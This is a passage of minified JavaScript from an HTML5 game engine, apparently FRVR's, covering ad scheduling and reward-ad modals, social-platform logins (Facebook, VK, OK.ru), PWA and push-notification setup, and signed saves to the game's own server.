            XS.unfreeze(), XS.emit("focus", {
                id: "gaAdvertisement"
            }), XS.emit("advertisementDone"), XS.stageContainer.removeChild(t), XS.off("resize", o, {
                freezeGroup: ENG_FRZ_GRP
            })
        }
        t.beginFill(0, .7), t.drawRect(0, 0, 200, 200), t.on("down", function() {}, {
            freezeGroup: ENG_FRZ_GRP
        });
        var n = e && e.first;

        function r() {
            XS.stageContainer.addChild(t)
        }

        function o() {
            t.width = width * XS.devicePixelRatio, t.height = height * XS.devicePixelRatio
        }
        XS.on("resize", o, {
            freezeGroup: ENG_FRZ_GRP
        }), o(), r();
        var a = 0;
        if (p) var s = XS.setInterval(function() {
            window.google ? (p = !1, XS.clearInterval(s), f(i, r, n)) : (50 == ++a || v) && (v = !0, XS.clearInterval(s), i())
        }, 100, [], ENG_FRZ_GRP);
        else f(i, r, n)
    }

    function y() {
        return !(!XS.is.iframed && XS.is.social) && (!!d() && (!!XS.is.okru || !XS.is.facebookApp && (!XS.is.kongregate && (!XS.is.miniclip && ((XS.is.advertisementOverlayEnabled || Config.googleFullscreenAsDefault) && !XS.is.advertisementIsDisabled)))))
    }

    function w(e) {
        var t = XS.data.fullScreenVideoCount;
        if (0 == t) return XS.data.fullScreenVideoCount = 1, !1;
        if (e && e.first) {
            if (XS.is.advertisementInterstitialDisabled) return !1;
            if (!a) return !1
        }
        var i = Math.max(3 - t / 10, .5);
        return "" === Host.Web.GetQueryString("google_ads") && (i = Math.min(i, 1)), XS.is.spilGamesWrapper && (i = .5), timeToWait = 60 * i * 1e3, (new Date).getTime() - g < timeToWait ? (console.warn("We already showed an ad! :), waiting", (new Date).getTime() - g, timeToWait), !1) : (t++, XS.data.fullScreenVideoCount = t, y())
    }
    XS.on("showFullscreenAd", function(e) {
        w(e) && m(e)
    }, {
        freezeGroup: ENG_FRZ_GRP
    }), XS.on("spawndebugmenu", function() {
        Sidebar.addAdsDebug(), Sidebar.addQaDebug(), Sidebar.addBuildInfo()
    }, {
        freezeGroup: ENG_FRZ_GRP
    });
    var S, x, b, _ = 0;

    function T() {
        window.fbq && (_++, fbq("trackCustom", "play", {
            game: Config.id,
            version: Config.version,
            tag: Config.tag || "",
            total_plays: _
        }))
    }

    function C(e) {
        XS.isFrozen() || XS.freeze(), Modal.show(e)
    }

    function R(e) {
        Modal.hide(function() {
            XS.isFrozen() && XS.unfreeze(), e && e()
        })
    }

    function M(e, t) {
        var i = document.createElement(e);
        return i.draggable = !1,
            function e(t, i) {
                for (var n in i) "object" != typeof i[n] ? t[n] = i[n] : (t[n] || (t[n] = {}), e(t[n], i[n]));
                return t
            }(i, t || {})
    }
    window.Social = function() {
        if (!Social.done && (Social.done = !0, !window.inScreenshotMode)) {
            XS.setTimeout(function() {
                var e = document.getElementsByTagName("content")[0] || document.getElementsByTagName("main")[0];
                e && e.parentNode && e.parentNode.removeChild(e)
            }, 1e3, [], ENG_FRZ_GRP), XS.is.windowsApp && (XS.is.enableAppStoreLinks = !1);
            XS.showRewardAd = function(e, t, i) {
                i = i || !1, XS.ads.show(e, function(e) {
                    var i, n;
                    n = t, "success" == (i = e) ? n("success") : "nofill" == i || "error" == i ? (window.Social.showFailToLoadAdsModal(), XS.setTimeout(function() {
                        window.Social.hideFailToLoadAdsModal(function() {
                            n("error")
                        })
                    }, 2e3, [], ENG_FRZ_GRP)) : "skipped" == i ? (window.Social.showAdSkippedModal(), XS.setTimeout(function() {
                        window.Social.hideAdSkippedModal(function() {
                            n("skipped")
                        })
                    }, 2e3, [], ENG_FRZ_GRP)) : "blocked" == i ? (window.Social.showAdBlockModal(), XS.setTimeout(function() {
                        window.Social.hideAdBlockModal(function() {
                            n("adBlocked")
                        })
                    }, 2e3, [], ENG_FRZ_GRP)) : "throttled" == i ? (console.log("Throttling reward ad, not showing"), window.Social.showFailToLoadAdsModal(), XS.setTimeout(function() {
                        window.Social.hideFailToLoadAdsModal(function() {
                            n("throttled")
                        })
                    }, 2e3, [], ENG_FRZ_GRP)) : n("error")
                }, {
                    showForce: i,
                    format: "reward",
                    maxRetries: 1,
                    timeoutInterval: 5e5
                })
            }, XS.showInterstitialAd = function(e) {
                if (Config.testLocalCanvasAds || (XS.is.facebookAppWeb || XS.is.chromeWrapper) && Config.useXSAdsForFbCanvasInterstitials) return Config.testLocalCanvasAds && console.error("Config.testLocalCanvasAds is true. Should only be used for testing!"), void XS.ads.show("interstitial_canvas", function(e) {
                    console.log("Canvas Interstitial show result: " + e)
                });
                T();
                var t = XS.data.interstitialPlayCount;
                XS.data.interstitialPlayCount = t + 1;
                var i = w();
                return e ? (m(), !0) : (i && m(), i || !1)
            }, y() && XS.loadScript("");
            var e = document.getElementById("overlay");
            if (XS.is.kik ? window.shareDialogueCallback = function(e) {
                    top.postMessage("share_kik", "*")
                } : XS.is.kongregate || XS.is.spilGamesWrapper || XS.is.twitch || XS.is.vkru || XS.is.okru || (Config.facebookAppId ? function() {
                    var t;

                    function i(e) {
                        FB.login(function(t) {
                            t.authResponse ? (n(t.authResponse), e && e()) : r(!1)
                        })
                    }

                    function n(e) {
                        XC.onFBAuth(e), r(!0)
                    }

                    function r(e) {
                        XS.is.nosoc || XS.is.rcs || XS.is.huawei || XS.is.miniclip || (XS.is.facebookApp ? e || i() : e ? (window.facebookAuthed = !0, t = Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_facebook.svg", !0)), Host.Localize.Translate("Logout"), function() {
                            Sidebar.removeMenuItem(t), FB.logout(function(e) {
                                XC.onFBDeauth(), r(!1)
                            })
                        })) : (window.facebookAuthed = !1, t = Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_facebook.svg", !0)), Host.Localize.Translate("Login with Facebook"), function() {
                            requestFacebookLogin()
                        })))
                    }
                    window.facebookAuthed = !1, window.requestFacebookLogin = function(e) {
                        Sidebar.removeMenuItem(t), i(e)
                    };
                    var o = !1;
                    XS.is.facebookAppWeb && !Config.facebookAdsDisabled && function(e) {
                        // function t() {
                        //     return e + "?rnd=" + (new Date).getTime()
                        // }
                        // var i = document.createElement("div");
                        // i.style.position = "absolute", i.style.height = "90px", i.style.bottom = "-100px", i.style.left = "50%";
                        // var n = document.createElement("iframe");
                        // n.src = t(), n.frameborder = "0", n.scrolling = "no", n.allowTransparency = "true", n.id = "adframe", n.style.cssText = "border:none;overflow:hidden;height:90px;width:728px;margin-left:-364px", i.appendChild(n), document.body.appendChild(i), XS.showGameOverAd = function(e) {
                        //     height / XS.devicePixelRatio > (e || 450) && (o = !0, i.style.bottom = "0px", XS.emit("toggleoverlayad", {
                        //         visible: !0
                        //     }))
                        // }, XS.hideGameOverAd = function() {
                        //     i.style.bottom = "-500px", o && (o = !1, n.src = t()), XS.emit("toggleoverlayad", {
                        //         visible: !1
                        //     })
                        // }
                    }("//" + Config.domain + "/ad/facebookLSM/");
                    var a, s, l, h, c = XS.setTimeout(function t() {
                            XS.clearTimeout(c), e.className = "", XS.setTimeout(function() {
                                e.className = "w"
                            }, 500, [], ENG_FRZ_GRP), c = XS.setTimeout(t, 18e4, [], ENG_FRZ_GRP)
                        }, 18e4, [], ENG_FRZ_GRP),
                        u = !1,
                        f = !1,
                        p = !1;

                    function g() {
                        var t = !u && !p;
                        Config.hideSocialWhilePlaying && !f && (t = !1), e.style.visibility = t ? "visible" : "hidden", e.style.bottom = t ? "3px" : "-200px"
                    }
                    XS.on("toggleoverlayad", function(e) {
                        u = e.visible, g()
                    }, {
                        freezeGroup: ENG_FRZ_GRP
                    }), XS.on("togglemodal", function(e) {
                        f = e.visible, g()
                    }, {
                        freezeGroup: ENG_FRZ_GRP
                    }), XS.on("togglesidebar", function(e) {
                        p = e.visible, g()
                    }, {
                        freezeGroup: ENG_FRZ_GRP
                    }), g(), Config.twitterTexts && (window.shareDialogueCallback = function(e) {
                        XS.navigate("https://twitter.com/share?url=" + Host.makeGameShareURL() + "&via=FRVRGames&related=" + encodeURI(Config.twitterRelated) + "&hashtags=" + encodeURI(Config.twitterHashTags) + "&text=" + encodeURI(d()))
                    }), window.fbAsyncInit = function() {
                        // FB.init({
                        //     appId: Config.facebookAppId,
                        //     status: !0,
                        //     xfbml: !1,
                        //     version: "v2.8",
                        //     cookie: !0
                        // }), FB.AppEvents.logPageView(), XS.is.facebookApp || XS.is.nosoc || XS.is.rcs || XS.is.huawei || XS.is.miniclip 
                        // || Sidebar.addMenuHeader(Host.Localize.Translate("Save your progress!")), 
                        // FB.getLoginStatus(function(e) {
                        //     "connected" === e.status ? n(e.authResponse) : r(!1)
                        // })
                    }, a = document, s = "facebook-jssdk", h = a.getElementsByTagName("script")[0], a.getElementById(s) || ((l = a.createElement("script")).id = s, 
                    	l.src = "", h.parentNode.insertBefore(l, h))
                }() : console.warn("Config.facebookAppId not defined"), 
                XS.is.nosoc || XS.is.rcs || XS.is.huawei || XS.is.miniclip || function() {
                    // var t = Host.Localize.GetLanguage();

                    // function i(t) {
                    //     var i = document.createElement("img");
                    //     i.src = vpath + "i/web/twitter.png", i.style.verticalAlign = "top", i.style.marginRight = "5px", i.style.cursor = "pointer", t ? (i.style.width = "82px", i.style.height = "30px") : (i.style.width = "58px", i.style.height = "20px", i.style.paddingLeft = "5px"), e.appendChild(i), i.onmousedown = i.ontouchstart = window.shareDialogueCallback
                    // }
                    // if (null != t.match(/zh/i) || t.match(/\-CN/i), XS.is.twitter) Config.twitterMobileHTML && Config.twitterTexts && Config.twitterNewMode && (e.innerHTML = "", i(!0), e.style.marginLeft = "-38px");
                    // else if (e.innerHTML = "", Config.twitterHTML && Config.twitterTexts && i(), Config.facebookHTML2 || Config.facebookPageUrl && Config.facebookAppId) {
                    //     var n = Config.facebookHTML2 || '<iframe src="https://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(Config.facebookPageUrl) + "&width=120&layout=button_count&action=like&size=small&show_faces=false&share=false&height=21&appId=" + Config.facebookAppId + '" width="120" height="21" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true"></iframe>',
                    //         r = document.createElement("span");
                    //     r.innerHTML = h(n), e.appendChild(r)
                    // }
                }()), ga(function() {
                    XS.setTimeout(function() {
                        window.location.hash = "", window.history && window.history.replaceState instanceof Function && window.history.replaceState({}, document.title, "./")
                    }, 5e3, [], ENG_FRZ_GRP)
                }), a || ("" === Host.Web.GetQueryString("google_ads") ? XS.data.acontained = !0 : XS.data.acontained && !XS.is.facebookApp && (top.location.href = "//" + Config.id + ".frvr.com/g/")), XS.is.samsungBixby && window.fbq && fbq("trackCustom", "samsung", {
                    game: Config.id,
                    version: Config.version,
                    tag: Config.tag || ""
                }), XS.is.pwa && Host.Preferences.GetString("rcs.id", function(e) {
                    e && (XS.is.rcs = e)
                }), window.rcs = {
                    url: "https://frvr-rcs-235815.appspot.com",
                    blockProgression: !1,
                    phone: null,
                    init: function(e, t) {
                        this.phone = XS.is.rcs, this.phone && (this.phone = this.phone.replace(/\s/g, ""), Host.Preferences.SetString("rcs.id", this.phone), this.createPlayer(e, function() {
                            if (console.log("created player"), t) return t()
                        })), console.log("initiated rcs")
                    },
                    getTasks: function(e, t) {
                        var i = new XMLHttpRequest;
                        i.onload = function() {
                            var e = JSON.parse(i.response);
                            return t(e)
                        }, i.open("GET", this.url + "/" + e + "/tasks/" + this.phone, !0), i.send()
                    },
                    createPlayer: function(e, t) {
                        var i = new XMLHttpRequest;
                        i.onload = function() {
                            return t()
                        }, i.open("POST", this.url + "/" + e + "/players/" + this.phone, !0), i.setRequestHeader("Content-Type", "application/json"), i.send()
                    },
                    updateStory: function(e, t) {
                        var i = new XMLHttpRequest,
                            n = this.url + "/" + e + "/story/" + this.phone;
                        t && t.task && (n += "?task=true"), i.open("PATCH", n, !0), i.send()
                    },
                    postGameSession: function(e, t) {
                        var i = new XMLHttpRequest;
                        i.onload = function() {
                            console.log(i.response)
                        }, console.log("posting data", t);
                        var n = this.url + "/" + e + "/gamesession/" + this.phone;
                        i.open("POST", n, !0), i.setRequestHeader("Content-Type", "application/json;charset=UTF-8"), i.send(JSON.stringify({
                            rcs: !0,
                            data: t
                        }))
                    }
                }, XS.is.rcs && XS.emit("RCS"), XS.is.vkru) {
                c("access_token", o = window.frames.document.URL), c("auth_key", o);
                var t = c("user_id", o),
                    i = c("viewer_id", o),
                    n = 6715022;

                function r() {
                    VK.init(function() {
                        VK.storage = {
                            user: i,
                            set: function(e, t) {
                                VK.api("storage.set", {
                                    user_id: this.user,
                                    key: e,
                                    value: t
                                }, function(e) {})
                            },
                            get: function(e, t) {
                                VK.api("storage.get", {
                                    user_id: this.user,
                                    keys: e
                                }, function(e) {
                                    return t(e)
                                })
                            }
                        }
                    }), console.log(admanInit({
                        user_id: t,
                        app_id: n,
                        type: "preloader"
                    }, function(e) {
                        e.onStarted(function() {
                            console.log("Adman: Started"), admanStat(n, t)
                        }), e.onCompleted(function() {
                            console.log("Adman: Completed")
                        }), e.onSkipped(function() {
                            console.log("Adman: Skipped")
                        }), e.onClicked(function() {
                            console.log("Adman: Clicked")
                        }), e.start("preroll")
                    }, function(e) {
                        console.log("Adman: No ads")
                    }))
                }
                console.warn("loading vk..."), XS.loadScript("https://vk.com/js/api/xd_connection.js?2"), XS.loadScript("https://ad.mail.ru/static/admanhtml/rbadman-html5.min.js"), XS.loadScript("https://vk.com/js/api/adman_init.js"), XS.loadScript("https://js.appscentrum.com/scr/preroll.js"), XS.waitForSDK("VK", r)
            }
            if (window.API_callback = function(e, t, i) {
                    console.log(e, t, i)
                }, XS.is.okru) {
                var o = window.frames.document.URL;

                function r() {
                    var e = FAPI.Util.getRequestParameters(),
                        t = e.logged_user_id,
                        i = e.application_key;
                    FAPI.init(e.api_server, e.apiconnection, function(e) {
                        console.warn("Initiated OK.ru!"), FAPI.invokeUIMethod("prepareMidroll"), XC.loginOKRU(t.toString(), i.toString())
                    })
                }
                console.warn("Loading OK.ru..."), XS.loadScript("https://api.ok.ru/js/fapi5.js"), XS.waitForSDK("FAPI", r)
            }
            if (Config.enablePWA) {
                "serviceWorker" in navigator && (navigator.serviceWorker.register("./sw.js").then(function(e) {
                    console.log("ServiceWorker registration successful with scope: ", e.scope)
                }, function(e) {
                    console.log("ServiceWorker registration failed: ", e)
                }), XS.is.pwa && XS.track.event("PWA Activated", "Activated"));
                var s = 0,
                    l = !1;
                window.addEventListener("beforeinstallprompt", function(e) {
                    XS.track.event("PWA Install Prompt", "Install Prompt"), s = setTimeout(u, 5e3), e.userChoice && e.userChoice.then(function(e) {
                        "accepted" === (e = e.outcome) && XS.track.event("PWA Installed", "Successfully Installed"), "dismissed" === e && XS.track.event("PWA Dismissed", "Install Prompt Dismissed"), u()
                    }).catch(function(e) {
                        console.log(e)
                    })
                }), window.addEventListener("appinstalled", function(e) {
                    XS.track.event("PWA Installed", "Successfully Installed"), u()
                })
            }
            Config.oneSignalWebId && !XS.is.iframed && (XS.is.android && !XS.is.pwa && Config.enablePWA || u())
        }

        function h(e) {
            var t = e += "";
            for (var i in Config) t = t.split("{{" + i + "}}").join(Config[i]);
            return t
        }

        function d() {
            return Host.Localize.Translate(Config.twitterTexts[Config.twitterTexts.length * Math.random() >> 0], {
                game_name: Config.shareTitle
            })
        }

        function c(e, t) {
            e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
            var i = new RegExp("[\\?&]" + e + "=([^&#]*)").exec(t);
            return null === i ? "" : decodeURIComponent(i[1].replace(/\+/g, " "))
        }

        function u() {
            clearTimeout(s), l || 
            // window.location.href.indexOf(Config.domain) > -1 && s
            (window.OneSignal = window.OneSignal || [], OneSignal.push(["init", {
                appId: Config.oneSignalWebId,
                autoRegister: !0,
                notifyButton: {
                    enable: !1
                },
                welcomeNotification: {
                    disable: !0
                }
            }]), XS.loadScript(""), l = !0)
        }
    }, window.Social.ShowTryAgainModal = function(e, t) {
        if (Config.testLocalCanvasAds || XS.is.facebookAppWeb || XS.is.chromeWrapper) {
            if (Config.testLocalCanvasAds && console.error("Config.testLocalCanvasAds is true. Should only be used for testing!"), !Config.useXSAdsForFbCanvasRewards) return !1;
            e = "reward_canvas"
        }
        L.showTryAgainModal(e, t)
    }, window.Social.showFailToLoadAdsModal = function() {
        e.showFailToLoadAdsModal()
    }, e.showFailToLoadAdsModal = function() {
        var e;
        C(S || (S = new(Modal.ModalOverlayContent.expand(function() {
            Modal.ModalOverlayContent.call(this), this.addHeadline(Host.Localize.Translate("No Ads Ready", {}, "Headline for no reward advertisement available")), this.addLead(Host.Localize.Translate("Please try again later", {}, "Description for no reward advertisement available")), this.blurClose = e || !1, this.innerHeight = 230
        }))))
    }, window.Social.hideFailToLoadAdsModal = function(e) {
        R(e)
    }, window.Social.showAdSkippedModal = function() {
        e.showAdSkippedModal()
    }, e.showAdSkippedModal = function() {
        var e;
        C(x || (x = new(Modal.ModalOverlayContent.expand(function() {
            Modal.ModalOverlayContent.call(this), this.addHeadline(Host.Localize.Translate("No reward received", {}, "Headline for advertisement skipped by user")), this.addLead(Host.Localize.Translate("You did not receive a reward\nbecause the ad was skipped", {}, "Description for advertisement skipped by user")), this.blurClose = e || !1, this.innerHeight = 300
        }))))
    }, window.Social.hideAdSkippedModal = function(e) {
        R(e)
    }, window.Social.showAdBlockModal = function() {
        e.showAdBlockModal()
    }, e.showAdBlockModal = function() {
        var e;
        C(b || (b = new(Modal.ModalOverlayContent.expand(function() {
            Modal.ModalOverlayContent.call(this), this.addHeadline(Host.Localize.Translate("Ad blocker detected", {}, "Headline for advertisement adblocker message")), this.addLead(Host.Localize.Translate("You did not receive a reward because\nyou are using an adblocker.\nPlease disable it to receive rewards", {}, "Description for advertisement adblocker detected")), this.blurClose = e || !1, this.innerHeight = 350
        }))))
    }, window.Social.hideAdBlockModal = function(e) {
        R(e)
    };
    var E = null;

    function A(e, t, i) {
        var n, r, o, a, s, l;
        r = function(t) {
            ({
                x: t.pageX,
                y: t.pageY
            }), E = e
        }, o = i, (n = e).addEventListener("mousedown", function(e) {
            (L.visible || o) && (P || r(e))
        }), n.addEventListener("touchstart", function(e) {
            P = !0, r(e.touches[0])
        }), s = function() {
            E == e && t()
        }, l = i, (a = e).addEventListener("mouseup", function(e) {
            (L.visible || l) && (P || s())
        }), a.addEventListener("touchend", function(e) {
            P = !0, s()
        })
    }
    var P = !1;
    var L = new function() {
        var e = this,
            t = {
                elements: {}
            };
        t.elements.blurOverlayNode = {
            style: {
                position: "absolute",
                top: "0px",
                left: "0px",
                width: "100%",
                height: "100%",
                background: " rgba(0, 0, 0, .75)",
                fontFamily: "Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif",
                cursor: "default",
                overflow: "hidden",
                MozUserSelect: "none",
                webkitUserSelect: "none",
                userSelect: "none",
                webkitTouchCallout: "none",
                zIndex: 20
            }
        }, t.elements.loaderOverlay = {
            style: {
                border: "10px solid rgba(255,255,255,.3)",
                borderTop: "10px solid #ffffff",
                borderRight: "10px solid #ffffff",
                borderRadius: "50%",
                width: "100px",
                height: "100px",
                position: "absolute",
                zIndex: 20,
                left: "50%",
                top: "50%",
                marginLeft: "-60px",
                marginTop: "-60px"
            }
        }, t.retryOverlay = {}, t.retryOverlay.overlay = {
            style: {
                width: "500px",
                left: "50%",
                position: "absolute",
                marginLeft: "-250px",
                bottom: "0px",
                zIndex: "20",
                textAlign: "center",
                MozUserSelect: "none",
                webkitUserSelect: "none",
                userSelect: "none",
                webkitTouchCallout: "none",
                fontFamily: "Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif",
                transformOrigin: "center bottom"
            }
        }, t.retryOverlay.headline = {
            style: {
                color: "#ffffff",
                fontSize: "70px",
                marginBottom: "0px",
                margin: "0px",
                padding: "0px",
                fontWeight: "500"
            },
            innerHTML: Host.Localize.Translate("Continue?", {}, "Headline in retry overlay").toString()
        }, t.retryOverlay.subtext = {
            style: {
                color: "#ffffff",
                fontSize: "30px",
                marginBottom: "0px",
                margin: "0px",
                padding: "0px",
                fontWeight: "500"
            },
            innerHTML: Host.Localize.Translate("Undo throw and keep playing", {}, "Headline subtext in retry overlay").toString()
        }, t.retryOverlay.counter = {
            style: {
                color: "#ffffff",
                fontSize: "150px",
                margin: "0px",
                padding: "0px",
                marginTop: "-25px",
                marginBottom: "0px",
                fontWeight: "300"
            },
            innerHTML: "9"
        }, t.retryOverlay.ad = {
            style: {
                width: "240px",
                height: "80px",
                backgroundImage: "url(" + vpath + "i/web/ad.png)",
                display: "inline-block",
                backgroundSize: "100% 100%",
                paddingTop: "160px",
                fontSize: "30px",
                margin: "4px",
                cursor: "pointer"
            },
            innerHTML: Host.Localize.Translate("Watch Ad", {}, "Watch Ad button in retry overlay").toString()
        }, t.retryOverlay.noThanks = {
            style: {
                display: "block",
                fontSize: "50px",
                fontWeight: "200",
                color: "#ffffff",
                marginTop: "40px",
                marginBottom: "60px",
                cursor: "pointer"
            },
            innerHTML: Host.Localize.Translate("Tap to continue", {}, "Tap to continue button text in retry overlay").toString()
        };
        var i = void 0;
        e.showTryAgainModal = function(e, n) {
            (i = i || new function() {
                var e = this,
                    i = M("div", t.retryOverlay.overlay),
                    n = M("h1", t.retryOverlay.headline),
                    r = M("h2", t.retryOverlay.subtext),
                    o = M("h1", t.retryOverlay.counter),
                    a = M("a", t.retryOverlay.ad),
                    s = M("a", t.retryOverlay.noThanks);
                e.update = function(e) {
                    e.headline && (n.innerHTML = e.headline.toString()), e.subtext && (r.innerHTML = e.subtext.toString())
                }, i.appendChild(n), i.appendChild(r), i.appendChild(o), i.appendChild(a), i.appendChild(s);
                var l = !1,
                    h = 0,
                    d = !1,
                    c = function() {},
                    u = void 0;

                function f() {
                    i.parentNode && i.parentNode.removeChild(i)
                }
                A(a, function() {
                    d = !0, f(), e.hide(), XS.showRewardAd(u, function(e) {
                        console.log("ad result: " + e), c("success" == e)
                    })
                }, !0), A(s, function() {
                    e.hide(), c(!1)
                }, !0), e.hide = function() {
                    l = !1, f(), L.hideLoadOverlay()
                }, e.show = function(t, n, r) {
                    c = r;
                    var s = !!n,
                        f = !1;
                    u = n, L.showLoadOverlay(),
                        function() {
                            if (!s && !f) return c(!1);
                            a.style.display = s ? "inline-block" : "none", o.innerHTML = h = t || 9, d = !1, l = !0, document.body.appendChild(i), e.handleResize()
                        }()
                }, e.handleResize = function() {
                    if (l) {
                        var e = Math.min(width / (i.offsetWidth || 500), Math.min(height / (i.offsetHeight || 577), Math.min(width / 500, 1)));
                        i.style.transform = 1 == e ? "" : "scale(" + e + "," + e + ")"
                    }
                }, XS.on("resize", e.handleResize), XS.setInterval(function() {
                    if (l && !d) {
                        if (--h < 0 && (h = 0), 0 == h) return e.hide(), void c(!1);
                        o.innerHTML = h
                    }
                }, 1e3)
            }).show(5, e, n)
        };
        var n = M("div", t.elements.blurOverlayNode),
            r = M("div", t.elements.loaderOverlay),
            o = 0;
        e.showLoadSpinner = function() {
            document.body.appendChild(r);
            var e = 0;
            r.style.transform = "rotate(" + e + "deg)", clearInterval(o), o = setInterval(function() {
                e += 4, r.style.transform = "rotate(" + e + "deg)"
            }, 16)
        }, e.hideLoadSpinner = function() {
            clearInterval(o), r.parentNode && r.parentNode.removeChild(r)
        };
        var a = 0;
        e.showLoadOverlay = function() {
            a++, n.parentNode || document.body.appendChild(n)
        }, e.hideLoadOverlay = function() {
            if (--a < 0 && (a = 0), 0 == a) {
                if (!n.parentNode) return;
                n.parentNode.removeChild(n)
            }
        }, window.Social.hideLoadSpinner = function() {
            e.hideLoadSpinner()
        }, window.Social.showLoadOverlay = function(t) {
            1 == t && (XS.isFrozen() || XS.freeze()), e.showLoadOverlay(), e.showLoadSpinner()
        }, window.Social.hideLoadOverlay = function(t) {
            1 == t && XS.isFrozen() && XS.unfreeze(), e.hideLoadOverlay(), e.hideLoadSpinner()
        }
    }
}

function InitSocial() {
    function e() {}
    e.prototype.onFinalScore = function(e) {
        XS.emit("std:final_score", {
            score: e
        })
    }, XS.social = XS.social || new function() {}, XS.events = XS.events || new e
}
window.location && window.location.search && window.location.search.indexOf("tsrv=") > -1 ? XC.server = "http://l.frvr.com:8008/" : XC.server = "https://xc.frvr.com/", XC.c = function() {
    for (var e = [], t = 0; 64 > t;) e[t] = 0 | 4294967296 * Math.abs(Math.sin(++t));
    return function(t) {
        for (var i, n, r, o, a = [], s = (t = unescape(encodeURI(t))).length, l = [i = 1732584193, n = -271733879, ~i, ~n], h = 0; h <= s;) a[h >> 2] |= (t.charCodeAt(h) || 128) << h++ % 4 * 8;
        for (a[t = 16 * (s + 8 >> 6) + 14] = 8 * s, h = 0; h < t; h += 16) {
            for (s = l, o = 0; 64 > o;) s = [r = s[3], (i = 0 | s[1]) + ((r = s[0] + [i & (n = s[2]) | ~i & r, r & i | ~r & n, i ^ n ^ r, n ^ (i | ~r)][s = o >> 4] + (e[o] + (0 | a[[o, 5 * o + 1, 3 * o + 5, 7 * o][s] % 16 + h]))) << (s = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21][4 * s + o++ % 4]) | r >>> 32 - s), i, n];
            for (o = 4; o;) l[--o] = l[o] + s[o]
        }
        for (t = ""; 32 > o;) t += (l[o >> 3] >> 4 * (1 ^ 7 & o++) & 15).toString(16);
        return t
    }
}(), XC.loggedin = !1, XC.slt = "I think you'll enjoy playing FRVR Games!", XC.user = XC.nouser = {
    set: function() {},
    get: function() {}
}, XC.send = function(e, t) {
    var i = t.data || {},
        n = t.load || function() {},
        r = t.error || function(e) {
            console.error("XC.error: ", e)
        },
        o = new XMLHttpRequest;
    o.addEventListener("load", function(e) {
        n(e.target.responseText)
    }), o.addEventListener("error", function(e) {
        r(e.target.responseText)
    });
    var a = function(t) {
        var n = new FormData,
            r = JSON.stringify(i),
            a = t || "";
        n.append("id", a), n.append("c", XC.c(XC.slt + a + r)), n.append("data", r), n.append("game", Config.id), o.open("POST", e), o.send(n)
    };
    XC.frvr_uid ? a(XC.frvr_uid) : XC.user && XC.user.id ? a(XC.user.id) : Host.Preferences.GetString("frvr.uid", a)
}, XC.onFBAuth = function(e) {
    XC.login(e)
}, XC.onFBDeauth = function() {
    XC.logout()
}, XC.login = function(e) {
    XC.send(XC.server + "login", {
        load: function(e) {
            var t = JSON.parse(e);
            XC.user = new XC.User(t), XC.loggedin = !0, XS.data._loadRemote(XC, XC.user.data), console.log("Logged in - returned uid: ", XC.user.id), Host.Preferences.SetString("frvr.uid", XC.user.id), XC.frvr_uid = XC.user.id, document.cookie = "frvr_uid=" + XC.user.id + ";path=/ ;max-age= 3153600000;expires=Fri, 01 Jan 2100 00:00:00 GMT", XS.emit("login", XC.user)
        },
        data: {
            id: XC.frvr_uid,
            fb_uid: e.userID,
            fb_auth: e.accessToken
        },
        error: function(e) {
            Host.Log("Login Error: " + e), XS.emit("login-error", e)
        }
    })
}, XC.setChange = function(e, t) {
    return !!XC.loggedin && (XC.user.set(e, t), !0)
}, XC.saveChanges = function(e) {
    XC.loggedin ? (XC.save(), e && e(!0)) : e && e(!1)
}, XC.loginOKRU = function(e, t) {
    XC.send(XC.server + "login", {
        load: function(e) {
            var t = JSON.parse(e);
            XC.user = new XC.User(t), XC.loggedin = !0, console.log("Logged in - returned uid: ", XC.user.id), Host.Preferences.SetString("frvr.uid", XC.user.id), XC.frvr_uid = XC.user.id, document.cookie = "frvr_uid=" + XC.user.id + ";path=/ ;max-age= 3153600000;expires=Fri, 01 Jan 2100 00:00:00 GMT", XS.emit("login", XC.user)
        },
        data: {
            id: XC.frvr_uid,
            fb_uid: e,
            fb_auth: t
        },
        error: function(e) {
            Host.Log("Login Error: " + e), XS.emit("login-error", e)
        }
    })
}, XC.save = function() {
    if (!XC.user || !XC.user.id) throw "Tried to XC.save without being logged in";
    XC.send(XC.server, {
        load: function(e) {
            JSON.parse(e);
            XS.emit("save", XC.user)
        },
        data: XC.user.data
    })
}, XC.logout = function() {
    XC.user = XC.nouser, XC.loggedin = !1, XS.emit("logout")
}, XC.User = function(e) {
    var t = this;
    t.data = e.data || {}, t.id = e.id || null, t.get = function(e) {
        return t.data[e]
    }, t.set = function(e, i) {
        t.data[e] = i
    }
}, XS.styles.margins.bottom = Math.max(23, XS.styles.margins.bottom), XS.modulesToPreload.push(Social), XS.modulesToPreload.push(InitSocial), XS.modulesToPreload.push(function() {
    var e;
    XS.data.addIntWithLocalKey("modalSliderComplexity", "modal.slider.complexity.v1", {
        remote: !1
    }), 0 == XS.data.modalSliderComplexity && (XS.data.modalSliderComplexity = 2), e = Container.expand(function() {
        Container.call(this);
        var e = this;
        this.backgroundColor = 16777215, this.isShowing = !1;
        var t = new Graphics;
        t.beginFill(0, .6), t.drawRect(0, 0, 200, 200), this.addChild(t), e.sounds = {
            button: void 0
        }, t.interactive = !0, t.defaultCursor = "pointer";
        var i = new Container;
        this.addChild(i);
        var n = new Graphics;
        i.addChild(n);
        var r = 800;

        function o() {
            if (LEGACY_COORD_SYSTEM) {
                var t = XS.devicePixelRatio;
                return ((height - XS.styles.margins.top - XS.styles.margins.bottom) / e.ratio * t - r) / 2 + XS.styles.margins.top / e.ratio * t
            }
            return ((XS.gui.height - XS.styles.margins.top - XS.styles.margins.bottom) / e.scale.y - r) / 2 + XS.styles.margins.top / e.scale.y
        }
        this.setHeight = function(t) {
            r = t, n.clear(), n.beginFill(e.backgroundColor, 1), n.drawRoundedRect(0, 0, 800, r, 35), LEGACY_COORD_SYSTEM ? this.ratio && this.setRatio && this.setRatio(this.ratio) : this.ratio && this.setRatio && this.setRatio(1)
        }, this.setHeight(800), this.redraw = function() {
            var n = XS.devicePixelRatio;
